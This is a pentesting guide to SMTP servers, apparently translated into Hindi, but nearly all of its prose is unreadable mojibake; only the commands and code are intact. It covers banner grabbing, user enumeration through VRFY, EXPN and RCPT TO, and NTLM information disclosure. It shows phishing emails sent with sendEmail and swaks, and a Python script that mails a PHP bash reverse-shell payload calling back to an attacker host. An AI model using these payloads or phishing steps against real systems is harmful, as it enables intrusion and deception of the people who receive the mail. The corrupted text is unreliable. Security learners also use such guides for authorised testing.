# **рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА**

**SMTP (рд╕рд┐рдВрдкрд▓ рдореЗрд▓ рдЯреНрд░рд╛рдВрд╕рдлрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓)** рдПрдХ TCP/IP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рдИ-рдореЗрд▓ рднреЗрдЬрдиреЗ** рдФрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЪреВрдВрдХрд┐ рдпрд╣ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЫреЛрд░ рдкрд░ рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рдХрддрд╛рд░рдмрджреНрдз рдХрд░рдиреЗ рдореЗрдВ рд╕реАрдорд┐рдд рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕рдХрд╛ рдЖрдорддреМрд░ рдкрд░ рджреЛ рдЕрдиреНрдп рдкреНрд░реЛрдЯреЛрдХреЙрд▓реЛрдВ, POP3 рдпрд╛ IMAP рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕рд░реНрд╡рд░ рдореЗрд▓рдмреЙрдХреНрд╕ рдореЗрдВ рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рд╕рд╣реЗрдЬрдиреЗ рдФрд░ рд╕рдордп-рд╕рдордп рдкрд░ рд╕рд░реНрд╡рд░ рд╕реЗ рдЙрдиреНрд╣реЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред

рджреВрд╕рд░реЗ рд╢рдмреНрджреЛрдВ рдореЗрдВ, **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдорддреМрд░ рдкрд░** рдПрдХ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ **SMTP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдИ-рдореЗрд▓ рднреЗрдЬрдиреЗ** рдФрд░ **POP3 рдпрд╛ IMAP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдИ-рдореЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд░рддрд╛ рд╣реИред Unix-рдЖрдзрд╛рд░рд┐рдд рд╕рд┐рд╕реНрдЯрдореЛрдВ рдкрд░, **sendmail** рдИ-рдореЗрд▓ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ SMTP рд╕рд░реНрд╡рд░ рд╣реИред рдПрдХ рд╡рд╛рдгрд┐рдЬреНрдпрд┐рдХ рдкреИрдХреЗрдЬ, Sendmail, рдореЗрдВ рдПрдХ POP3 рд╕рд░реНрд╡рд░ рд╢рд╛рдорд┐рд▓ рд╣реИред **Microsoft Exchange** рдореЗрдВ рдПрдХ SMTP рд╕рд░реНрд╡рд░ рд╢рд╛рдорд┐рд▓ рд╣реИ рдФрд░ рдЗрд╕реЗ POP3 рд╕рдорд░реНрдерди рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рд╕реЗрдЯрдЕрдк рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
[рдпрд╣рд╛рдБ рд╕реЗ](https://whatis.techtarget.com/definition/SMTP-Simple-Mail-Transfer-Protocol).

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ:** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
### EMAIL рд╣реИрдбрд░реНрд╕

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдкреАрдбрд╝рд┐рдд рдХреЛ рдЖрдкрдХреЛ рдПрдХ рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рдХрд╛ рдЕрд╡рд╕рд░** рдорд┐рд▓рддрд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рд╡реЗрдм рдкреЗрдЬ рдХреЗ рд╕рдВрдкрд░реНрдХ рдлреЙрд░реНрдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ), рддреЛ рдЗрд╕реЗ рдХрд░реЗрдВ рдХреНрдпреЛрдВрдХрд┐ **рдЖрдк рдкреАрдбрд╝рд┐рдд рдХреЗ рдЖрдВрддрд░рд┐рдХ рдЯреЛрдкреЛрд▓реЙрдЬреА рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ** рдИрдореЗрд▓ рдХреЗ рд╣реИрдбрд░реНрд╕ рдХреЛ рджреЗрдЦрдХрд░ред

рдЖрдк рдПрдХ SMTP рд╕рд░реНрд╡рд░ рд╕реЗ рднреА рдПрдХ рдИрдореЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕реЗ **рдЙрд╕ рд╕рд░реНрд╡рд░ рдкрд░ рдПрдХ рдЧреИрд░-рдореМрдЬреВрдж рдкрддреЗ рдкрд░ рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдХреЗ** (рдХреНрдпреЛрдВрдХрд┐ рд╕рд░реНрд╡рд░ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдХ NDN рдИрдореЗрд▓ рднреЗрдЬреЗрдЧрд╛)ред рд▓реЗрдХрд┐рди, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдк рдИрдореЗрд▓ рдПрдХ рдЕрдиреБрдордд рдкрддреЗ рд╕реЗ рднреЗрдЬреЗрдВ (SPF рдиреАрддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ) рдФрд░ рдЖрдк NDN рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдкрдХреЛ рдпрд╣ рднреА рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ **рд╡рд┐рднрд┐рдиреНрди рд╕рд╛рдордЧреНрд░реА рднреЗрдЬреЗрдВ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рд╣реИрдбрд░реНрд╕ рдореЗрдВ рдЕрдзрд┐рдХ рд░реЛрдЪрдХ рдЬрд╛рдирдХрд╛рд░реА рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреИрд╕реЗ: `X-Virus-Scanned: by av.domain.com`\
рдЖрдкрдХреЛ EICAR рдЯреЗрд╕реНрдЯ рдлрд╛рдЗрд▓ рднреЗрдЬрдиреА рдЪрд╛рд╣рд┐рдПред\
**AV** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рд╕реЗ рдЖрдкрдХреЛ **рдЬреНрдЮрд╛рдд рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓ рд╕рдХрддреА рд╣реИред**

## рдореВрд▓ рдХреНрд░рд┐рдпрд╛рдПрдБ

### **рдмреИрдирд░ рдЧреНрд░реИрдмрд┐рдВрдЧ/рдореВрд▓ рдХрдиреЗрдХреНрд╢рди**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS**:
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### рд╕рдВрдЧрдарди рдХреЗ MX рд╕рд░реНрд╡рд░реНрд╕ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛
```bash
dig +short mx google.com
```
### рдПрдиреНрдпреВрдорд░реЗрд╢рди
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг - рд╕реВрдЪрдирд╛ рдкреНрд░рдХрдЯреАрдХрд░рдг

рдпрджрд┐ рд╕рд░реНрд╡рд░ NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг (Windows) рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЖрдк рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА (рд╕рдВрд╕реНрдХрд░рдг) рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [**рдпрд╣рд╛рдБ**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666) рдкрд░ред
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
рдпрд╛ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд** рдХрд░реЗрдВ **nmap** рдкреНрд▓рдЧрдЗрди `smtp-ntlm-info.nse` рдХреЗ рд╕рд╛рде

### рдЖрдВрддрд░рд┐рдХ рд╕рд░реНрд╡рд░ рдХрд╛ рдирд╛рдо - рд╕реВрдЪрдирд╛ рдкреНрд░рдХрдЯреАрдХрд░рдг

рдХреБрдЫ SMTP рд╕рд░реНрд╡рд░ "MAIL FROM" рдХрдорд╛рдВрдб рдЬрд╛рд░реА рдХрд░рдиреЗ рдкрд░ рдПрдХ рдкреВрд░реНрдг рдкрддреЗ рдХреЗ рдмрд┐рдирд╛ рдкреНрд░реЗрд╖рдХ рдХреЗ рдкрддреЗ рдХреЛ рд╕реНрд╡рддрдГ рдкреВрд░рд╛ рдХрд░рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдЙрдирдХрд╛ рдЖрдВрддрд░рд┐рдХ рдирд╛рдо рдкреНрд░рдХрдЯ рд╣реЛрддрд╛ рд╣реИ:
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### рд╕реНрдирд┐рдлрд┐рдВрдЧ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдкреЛрд░реНрдЯ 25 рдкрд░ рдкреИрдХреЗрдЯреНрд╕ рд╕реЗ рдХреБрдЫ рдкрд╛рд╕рд╡рд░реНрдб рд╕реНрдирд┐рдл рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ

### [Auth bruteforce](../../generic-methodologies-and-resources/brute-force.md#smtp)

## рдпреВрдЬрд░рдиреЗрдо рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдПрдиреНрдпреБрдорд░реЗрд╢рди

**рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╣рдореЗрд╢рд╛ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реЛрддрд╛**

### RCPT TO
```bash
$ telnet 10.0.10.1 25
Trying 10.0.10.1...
Connected to 10.0.10.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello [10.0.0.99], pleased to meet you
MAIL FROM:test@test.org
250 2.1.0 test@test.org... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY
```
$ telnet 10.0.0.1 25
Trying 10.0.0.1...
Connected to 10.0.0.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello [10.0.0.99], pleased to meet you
VRFY root
250 Super-User <root@myhost>
VRFY blah
550 blah... User unknown
```
### EXPN
```
$ telnet 10.0.10.1 25
Trying 10.0.10.1...
Connected to 10.0.10.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 <ed.williams@myhost>
EXPN sshd
250 2.1.5 sshd privsep <sshd@mail2>
```
### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**рддрддреНрдХрд╛рд▓ рдЙрдкрд▓рдмреНрдз рд╕реЗрдЯрдЕрдк рд╡рд▓реНрдирд░реЗрдмрд┐рд▓рд┐рдЯреА рдЕрд╕реЗрд╕рдореЗрдВрдЯ рдФрд░ рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП**ред рдХрд╣реАрдВ рд╕реЗ рднреА 20+ рдЯреВрд▓реНрд╕ рдФрд░ рдлреАрдЪрд░реНрд╕ рдХреЗ рд╕рд╛рде рдкреВрд░рд╛ рдкреЗрдВрдЯреЗрд╕реНрдЯ рдЪрд▓рд╛рдПрдВ рдЬреЛ рд░реЗрдХреЙрди рд╕реЗ рд▓реЗрдХрд░ рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ рддрдХ рдЬрд╛рддреЗ рд╣реИрдВред рд╣рдо рдкреЗрдВрдЯреЗрд╕реНрдЯрд░реНрд╕ рдХреА рдЬрдЧрд╣ рдирд╣реАрдВ рд▓реЗрддреЗ - рд╣рдо рдХрд╕реНрдЯрдо рдЯреВрд▓реНрд╕, рдбрд┐рдЯреЗрдХреНрд╢рди рдФрд░ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди рдореЙрдбреНрдпреВрд▓реНрд╕ рд╡рд┐рдХрд╕рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЙрдиреНрд╣реЗрдВ рдФрд░ рдЧрд╣рд░рд╛рдИ рд╕реЗ рдЦреЛрдЬрдиреЗ, рдкреЙрдк рд╢реЗрд▓реНрд╕, рдФрд░ рдордЬреЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдордп рд╡рд╛рдкрд╕ рдорд┐рд▓ рд╕рдХреЗред

{% embed url="https://pentest-tools.com/" %}

## DSN рд░рд┐рдкреЛрд░реНрдЯреНрд╕

**рдбрд┐рд▓реАрд╡рд░реА рд╕реНрдЯреЗрдЯрд╕ рдиреЛрдЯрд┐рдлрд┐рдХреЗрд╢рди рд░рд┐рдкреЛрд░реНрдЯреНрд╕**: рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рд╕рдВрдЧрдарди рдХреЛ **рдИрдореЗрд▓** рднреЗрдЬрддреЗ рд╣реИрдВ рдФрд░ рд╡рд╣ **рдЕрдорд╛рдиреНрдп рдкрддреЗ** рдкрд░ рд╣реЛ, рддреЛ рд╕рдВрдЧрдарди рдЖрдкрдХреЛ рд╕реВрдЪрд┐рдд рдХрд░реЗрдЧрд╛ рдХрд┐ рдкрддрд╛ рдЕрдорд╛рдиреНрдп рдерд╛ рдФрд░ рдЖрдкрдХреЛ **рд╡рд╛рдкрд╕ рдореЗрд▓ рднреЗрдЬреЗрдЧрд╛**ред рд▓реМрдЯрд╛рдП рдЧрдП рдИрдореЗрд▓ рдХреЗ **рд╣реЗрдбрд░реНрд╕** рдореЗрдВ рд╕рдВрднрд╛рд╡рд┐рдд **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддреА рд╣реИ (рдЬреИрд╕реЗ рдХрд┐ рдореЗрд▓ рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ IP рдкрддрд╛ рдЬрд┐рдиреНрд╣реЛрдВрдиреЗ рд░рд┐рдкреЛрд░реНрдЯреНрд╕ рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд┐рдпрд╛ рдпрд╛ рдПрдВрдЯреА-рд╡рд╛рдпрд░рд╕ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдХреА рдЬрд╛рдирдХрд╛рд░реА)ред

## [рдХрдорд╛рдВрдбреНрд╕](smtp-commands.md)

### рд▓рд┐рдирдХреНрд╕ рдХрдВрд╕реЛрд▓ рд╕реЗ рдИрдореЗрд▓ рднреЗрдЬрдирд╛
```
root@kali:~# sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

IT Dept,

We are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems.

Sincerely,
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
### рдкрд╛рдпрдерди рдХреЗ рд╕рд╛рде рдИрдореЗрд▓ рднреЗрдЬрдирд╛

рдпрд╣рд╛рдБ рдкрд╛рдпрдерди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╕рд╛рде рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рдХрд╛ рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ рддрд░реАрдХрд╛ рд╣реИ
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
## рдореЗрд▓ рд╕реНрдкреВрдлрд┐рдВрдЧ

рдЗрд╕ рдЦрдВрдб рдХрд╛ рдЕрдзрд┐рдХрд╛рдВрд╢ рднрд╛рдЧ **Network Security Assessment 3rd Edition** рдкреБрд╕реНрддрдХ рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

SMTP рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рд╕реНрдкреВрдл рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╕рдВрдЧрдарди **SPF**, **DKIM**, рдФрд░ **DMARC** рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдирдзрд┐рдХреГрдд рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рд╕реЗ рд░реЛрдХрддреЗ рд╣реИрдВред

**рдЗрди рдЙрдкрд╛рдпреЛрдВ рдХреА рдкреВрд░реА рдЧрд╛рдЗрдб** рдЖрдк [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/) рдкрд░ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

### SPF

{% hint style="danger" %}
SPF рдХреЛ 2014 рдореЗрдВ "deprecated" рдХрд╣рд╛ рдЧрдпрд╛ рдерд╛ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ `_spf.domain.com` рдореЗрдВ **TXT record** рдмрдирд╛рдиреЗ рдХреЗ рдмрдЬрд╛рдп рдЖрдк рдЗрд╕реЗ `domain.com` рдореЗрдВ **рд╕рдорд╛рди рд╕рд┐рдВрдЯреИрдХреНрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрдирд╛рддреЗ рд╣реИрдВред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдкрд┐рдЫрд▓реЗ spf рд░рд┐рдХреЙрд░реНрдбреНрд╕ рдХрд╛ рдкреБрди: рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдХреНрд╕рд░ рдРрд╕рд╛ рдХреБрдЫ рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ `"v=spf1 include:_spf.google.com ~all"`
{% endhint %}

**Sender Policy Framework** (SPF) рдПрдХ рддрдВрддреНрд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ MTAs рдХреЛ рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдХрд┐ рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рд╡рд╛рд▓рд╛ рд╣реЛрд╕реНрдЯ рдЕрдзрд┐рдХреГрдд рд╣реИ рдпрд╛ рдирд╣реАрдВред\
рдлрд┐рд░, рд╕рдВрдЧрдарди рдЕрдзрд┐рдХреГрдд рдореЗрд▓ рд╕рд░реНрд╡рд░реЛрдВ рдХреА рдПрдХ рд╕реВрдЪреА рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ MTAs рдЗрд╕ рд╕реВрдЪреА рдХреЛ рдХреНрд╡реЗрд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХреЗрдВ рдХрд┐ рдИрдореЗрд▓ рд╕реНрдкреВрдл рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВред\
рдХрд┐рд╕реА рдбреЛрдореЗрди рдирд╛рдо рдХреА рдУрд░ рд╕реЗ рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП **рдЕрдиреБрдордд IP рдкрддреЗ/рд░реЗрдВрдЬ, рдбреЛрдореЗрди рдФрд░ рдЕрдиреНрдп** рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, SPF рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди "**Mechanism**" рджрд┐рдЦрд╛рдИ рджреЗ рд╕рдХрддреЗ рд╣реИрдВред

#### Mechanisms

| Mechanism | Description                                                                                                                                                                                                                                                                                                                         |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | рд╣рдореЗрд╢рд╛ рдореИрдЪ рдХрд░рддрд╛ рд╣реИ; рдкрд╣рд▓реЗ рдХреЗ mechanisms рджреНрд╡рд╛рд░рд╛ рдореИрдЪ рдирд╣реАрдВ рдХрд┐рдП рдЧрдП рд╕рднреА IPs рдХреЗ рд▓рд┐рдП рдПрдХ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкрд░рд┐рдгрд╛рдо рдХреЗ рд░реВрдк рдореЗрдВ `-all` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред                                                                                                                                                                                                                                  |
| A         | рдпрджрд┐ рдбреЛрдореЗрди рдирд╛рдо рдХрд╛ рдПрдХ рдкрддрд╛ рд░рд┐рдХреЙрд░реНрдб (A рдпрд╛ AAAA) рд╣реИ рдЬреЛ рдкреНрд░реЗрд╖рдХ рдХреЗ рдкрддреЗ рдХреЛ рд╣рд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдореИрдЪ рд╣реЛрдЧрд╛ред                                                                                                                                                                                                                   |
| IP4       | рдпрджрд┐ рдкреНрд░реЗрд╖рдХ рдПрдХ рдирд┐рд░реНрджрд┐рд╖реНрдЯ IPv4 рдкрддрд╛ рд░реЗрдВрдЬ рдореЗрдВ рд╣реИ, рдореИрдЪ рдХрд░реЗрдВред                                                                                                                                                                                                                                                                              |
| IP6       | рдпрджрд┐ рдкреНрд░реЗрд╖рдХ рдПрдХ рдирд┐рд░реНрджрд┐рд╖реНрдЯ IPv6 рдкрддрд╛ рд░реЗрдВрдЬ рдореЗрдВ рд╣реИ, рдореИрдЪ рдХрд░реЗрдВред                                                                                                                                                                                                                                                                              |
| MX        | рдпрджрд┐ рдбреЛрдореЗрди рдирд╛рдо рдХрд╛ рдПрдХ MX рд░рд┐рдХреЙрд░реНрдб рдкреНрд░реЗрд╖рдХ рдХреЗ рдкрддреЗ рдХреЛ рд╣рд▓ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдореИрдЪ рд╣реЛрдЧрд╛ (рдЕрд░реНрдерд╛рддреН рдореЗрд▓ рдбреЛрдореЗрди рдХреЗ рдЖрдиреЗ рд╡рд╛рд▓реЗ рдореЗрд▓ рд╕рд░реНрд╡рд░реЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рд╕реЗ рдЖрддрд╛ рд╣реИ)ред                                                                                                                                                                          |
| PTR       | рдпрджрд┐ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рдкрддреЗ рдХреЗ рд▓рд┐рдП рдбреЛрдореЗрди рдирд╛рдо (PTR рд░рд┐рдХреЙрд░реНрдб) рджрд┐рдП рдЧрдП рдбреЛрдореЗрди рдореЗрдВ рд╣реИ рдФрд░ рд╡рд╣ рдбреЛрдореЗрди рдирд╛рдо рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рдкрддреЗ рдХреЛ рд╣рд▓ рдХрд░рддрд╛ рд╣реИ (рдлреЙрд░рд╡рд░реНрдб-рдХрдиреНрдлрд░реНрдореНрдб рд░рд┐рд╡рд░реНрд╕ DNS), рдореИрдЪ рдХрд░реЗрдВред рдЗрд╕ рдореИрдХреЗрдирд┐рдЬрд╝реНрдо рдХреЛ рд╣рддреЛрддреНрд╕рд╛рд╣рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдпрджрд┐ рд╕рдВрднрд╡ рд╣реЛ рддреЛ рдЗрд╕рд╕реЗ рдмрдЪрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред                                                                                     |
| EXISTS    | рдпрджрд┐ рджрд┐рдпрд╛ рдЧрдпрд╛ рдбреЛрдореЗрди рдирд╛рдо рдХрд┐рд╕реА рднреА рдкрддреЗ рдХреЛ рд╣рд▓ рдХрд░рддрд╛ рд╣реИ, рдореИрдЪ рдХрд░реЗрдВ (рдЪрд╛рд╣реЗ рд╡рд╣ рдХрд┐рд╕ рдкрддреЗ рдХреЛ рд╣рд▓ рдХрд░рддрд╛ рд╣реИ)ред рдпрд╣ рджреБрд░реНрд▓рднрддрд╛ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред SPF рдореИрдХреНрд░реЛ рднрд╛рд╖рд╛ рдХреЗ рд╕рд╛рде рдпрд╣ DNSBL-рдХреНрд╡реЗрд░реАрдЬрд╝ рдЬреИрд╕реЗ рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рдореИрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред                                                                                                                                                                                           |
